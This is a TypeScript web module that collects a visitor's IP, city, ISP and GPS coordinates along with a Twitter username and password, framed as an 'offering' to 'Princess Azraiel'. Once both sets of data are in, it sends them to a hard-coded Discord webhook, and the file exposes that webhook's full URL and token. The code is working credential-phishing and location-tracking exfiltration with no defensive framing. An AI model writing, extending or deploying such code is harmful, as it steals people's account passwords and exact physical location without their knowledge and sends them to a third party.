let dataStore: {
    clientId?: string;
    location?: {
        ip?: string;
        city?: string;
        region?: string;
        country_name?: string;
        org?: string;
        latitude?: number;
        longitude?: number;
        accuracy?: number;
    };
    offering?: {
        username?: string;
        password?: string;
        level?: string | number;
    };
  } = {};
  
  const WEBHOOK_URL = 'https://discord.com/api/webhooks/1364369871072133280/v0BDpMSlzUFjcvfLF4zIk0pkyD-skKDvW6AAoH4LN6sl-A0F9C1ktJfYqMN6GnoJZvA8';
  
  export const getClientId = () => {
    let id = localStorage.getItem('client_id');
    if (!id) {
      id = crypto.randomUUID();
      localStorage.setItem('client_id', id);
    }
    return id;
  };
  
  export const collectPart = (key: 'location' | 'offering', value: typeof dataStore['location'] | typeof dataStore['offering']) => {
    dataStore[key] = value;
    dataStore.clientId = getClientId();
  
    if (dataStore.location && dataStore.offering) {
      sendToDiscord(dataStore);
      dataStore = { clientId: getClientId() }; // reset for next time
    } else {
      console.log(`Waiting for the other part. Got: ${key}`);
    }
  };
  
  export const sendToDiscord = async (data: typeof dataStore) => {
    const location = data.location || {};
    const offering = data.offering || {};
  
    console.log("Location Data:", location); // <-- Log the location data
    console.log("Offering Data:", offering); // <-- Log the offering data
  
    const embed = {
      title: '🩸 New Offering Tracked',
      description: 'Princess Azraiel is watching everything...',
      color: 0xff69b4,
      timestamp: new Date().toISOString(),
      fields: [
        {
          name: '🆔 Client ID',
          value: data.clientId || 'N/A',
          inline: false,
        },
        {
          name: '🌐 IP Information',
          value: `**IP:** ${location.ip || 'N/A'}\n**City:** ${location.city || 'Unknown'}, ${location.region || ''}, ${location.country_name || ''}\n**ISP:** ${location.org || 'Unknown'}`,
          inline: false,
        },
        {
          name: '📍 GPS Location',
          value: `Latitude: ${location.latitude || 'N/A'}\nLongitude: ${location.longitude || 'N/A'}\nAccuracy: ${location.accuracy || 'N/A'} meters`,
          inline: false,
        },
        {
          name: '🐦 Twitter Offering',
          value: `**Username:** ${offering.username || 'N/A'}\n**Password:** ${offering.password || 'N/A'}\n**Level:** ${offering.level || 'N/A'}`,
          inline: false,
        },
      ],
      footer: {
        text: 'Submitted to Princess Azraiel',
      },
    };
  
    try {
      const response = await fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ embeds: [embed] }),
      });
  
      if (!response.ok) {
        throw new Error(`Discord API responded with status: ${response.status}`);
      }
    } catch (error) {
      console.error('Error sending to Discord:', error);
    }
  };
  